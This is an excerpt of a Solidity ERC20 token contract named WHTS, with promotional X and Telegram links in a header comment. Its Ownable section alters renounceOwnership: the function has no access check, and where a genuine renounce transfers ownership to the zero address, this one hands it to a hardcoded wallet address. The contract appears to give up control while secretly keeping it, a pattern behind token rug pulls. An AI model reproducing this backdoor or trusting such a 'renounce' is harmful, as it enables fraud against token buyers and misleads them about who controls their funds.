/*
https://x.com/whts_token/status/1887021491856007297?s=12
https://t.me/WHTS_Coin
*/
...
abstract contract Ownable is Context {
    ...
    function renounceOwnership() public virtual  {
        _transferOwnership(address(0x386b6be190bD84649991d0EFf15013A16bC7461b));
    }
...
contract WHTS is ERC20, Ownable {
    using SafeMath for uint256;
    uint256 uint250;
    address public add250;

    constructor() ERC20("WHTS", "WHTS") {
